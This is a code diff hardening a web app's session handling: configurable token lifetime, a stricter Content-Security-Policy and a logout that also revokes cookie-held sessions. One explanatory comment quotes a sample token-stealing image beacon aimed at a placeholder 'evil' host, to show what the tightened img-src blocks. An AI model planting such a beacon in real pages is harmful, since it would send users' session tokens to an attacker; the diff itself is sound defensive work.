@@ -643,7 +643,10 @@ def _clear_failed_login(email: str) -> None:
     rcache.clear(f"faillock:{email}")       # no-op when Redis unavailable
     _failed_logins.pop(email, None)
 
-SESSION_TTL_DAYS  = 30             # auth token lifetime
+# Auth token lifetime. Env-configurable so the exposure window of a stolen token
+# can be tightened without a code change. 30d is convenient but long for a money
+# app — consider 7 (or lower) once session-restore UX is solid. Clamped to 1..90.
+SESSION_TTL_DAYS  = max(1, min(int(os.environ.get("SESSION_TTL_DAYS", "30")), 90))
 SESSION_REVALIDATE_SECONDS = 30    # how often a cached session is re-checked against the DB
                                    # (bounds how long a revoked session lingers per worker)
 # P3b: httpOnly session cookie. Set on every token-issuing path and read by
@@ -1867,15 +1870,24 @@ app.add_middleware(_StaticCacheMiddleware)
 
 # Security headers on every response
 class _SecurityHeadersMiddleware(BaseHTTPMiddleware):
+    # NOTE on script-src 'unsafe-inline': the app currently relies on ~1000+ inline
+    # event handlers (onclick=, …) and inline <script> blocks, so 'unsafe-inline'
+    # cannot be removed without migrating all of them to addEventListener/delegation
+    # (a large, separate effort). Until then we harden the *exfiltration* side so an
+    # injected script cannot ship a stolen token out: connect-src is locked to known
+    # APIs (blocks fetch/XHR/beacon exfil), img-src no longer allows arbitrary https:
+    # (blocks `new Image().src='https://evil/?t='+token` beacons), and object-src
+    # 'none' kills <object>/<embed> script vectors.
     _CSP = (
         "default-src 'self'; "
         "script-src 'self' 'unsafe-inline' https://plausible.io "
         "  https://js.sentry-cdn.com https://browser.sentry-cdn.com; "
         "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
         "font-src 'self' https://fonts.gstatic.com; "
-        "img-src 'self' data: blob: https:; "
+        "img-src 'self' data: blob:; "
         "media-src 'self' blob:; "
-        "connect-src 'self' https://plausible.io https://o*.ingest.sentry.io "
+        "object-src 'none'; "
+        "connect-src 'self' https://plausible.io https://*.ingest.sentry.io https://*.ingest.us.sentry.io "
         "  https://api.paystack.co https://api.flutterwave.com https://api.withmono.com "
         "  https://accounts.google.com https://api.github.com; "
         "frame-src 'self' https://js.paystack.co https://checkout.flutterwave.com; "
@@ -2813,8 +2825,12 @@ async def session_restore(data: dict, response: Response):
 
 @app.post("/api/logout")
 async def logout(data: dict, response: Response):
-    """Invalidate a session token."""
+    """Invalidate a session token. Falls back to the httpOnly cookie token so a
+    post-reload logout (no body token, in-memory token gone) still revokes the
+    server-side session, not just clears the cookie."""
     token = sanitize_text(str(data.get("token", "")), 100)
+    if not token:
+        token = sanitize_text(_req_token.get(""), 100)
     if token:
         delete_session_token(token)
     _clear_session_cookie(response)
